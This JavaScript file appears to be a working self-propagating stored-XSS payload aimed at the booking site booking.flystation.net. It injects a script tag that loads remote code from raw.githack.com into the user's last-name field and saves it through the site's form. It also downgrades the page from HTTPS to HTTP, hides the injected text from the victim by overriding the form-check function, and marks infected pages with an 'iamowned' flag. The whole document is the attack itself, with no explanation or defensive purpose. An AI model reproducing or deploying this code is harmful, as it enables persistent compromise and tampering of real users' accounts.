var evilApp = evilApp || {};

(function () {
  const config = {
    payload: {
      fieldName: "userlastname",
      value: "<script src='https://raw.githack.com/trionia/trionia.github.io/main/flystation.js'/>"
    },
    baseUrl: `${location.protocol}//booking.flystation.net`,
    oldCheckForm: window.checkForm
  };

  this.Die = function() {
    window.checkForm = config.oldCheckForm;
  }

  this.DowngradeConnection = function () {
    const isBooking = location.href.startsWith("https://booking.");
    if (isBooking)
      location.href = location.href.replace("https", "http");
  }

  this.PropagateAsync = async function () {
    const page = await this.LoadMyDataPageAsync();
    const formData = new FormData(page.querySelector("form"));

    if (IsAlreadyInjected(formData)) return;

    InjectFormPayload(formData);
    PostFormToSave(formData);
  };

  this.LoadMyDataPageAsync = async function () {
    return await fetch(config.baseUrl + "/MyData")
      .then(r => r.text())
      .then(text => {
        const parser = new DOMParser();
        return parser.parseFromString(text, "text/html");
      });
  }

  function GetPayloadFieldNameAndValue() {
    const { payload: { value: payloadValue, fieldName: fieldName } } = config;
    return {fieldName, payloadValue};
  }

  function IsAlreadyInjected(formData) {
    const {fieldName, payloadValue} = GetPayloadFieldNameAndValue();
    const field = formData.get(fieldName);
    return field.indexOf(payloadValue) >= 0;
  }

  function InjectFormPayload(formData) {
    const {fieldName, payloadValue} = GetPayloadFieldNameAndValue();
    const field = formData.get(fieldName);
    formData.set(fieldName, field + payloadValue);
  }

  function PostFormToSave(formData) {
    const request = new XMLHttpRequest();
    request.open("POST", config.baseUrl + "/MyData/Save");
    request.send(formData);
  }

  this.MaskInjectedField = function()
  {
    const {fieldName, payloadValue} = GetPayloadFieldNameAndValue();
    var field = document.getElementById(fieldName);
    if (typeof field === undefined || field === null) return;

    const idx = field.value.indexOf(payloadValue);
    if (idx > 0) {
      field.value = field.value.slice(0, idx);
    }

    const form = document.getElementById("fs-form-personaldata");
    window.checkForm = function() {
      const substituteField = field.cloneNode();
      field.removeAttribute("id");
      field.removeAttribute("name");
      
      substituteField.hidden = true;
      substituteField.value = field.value + payloadValue;
      field.parentElement.append(substituteField);

      config.oldCheckForm();
    }
  }

}).apply(evilApp);

(async () => {
  if (window.iamowned === true) return;
  window.iamowned = true;

  console.log("Hello from xss");

  evilApp.MaskInjectedField();
  evilApp.DowngradeConnection();
  await evilApp.PropagateAsync();
})();
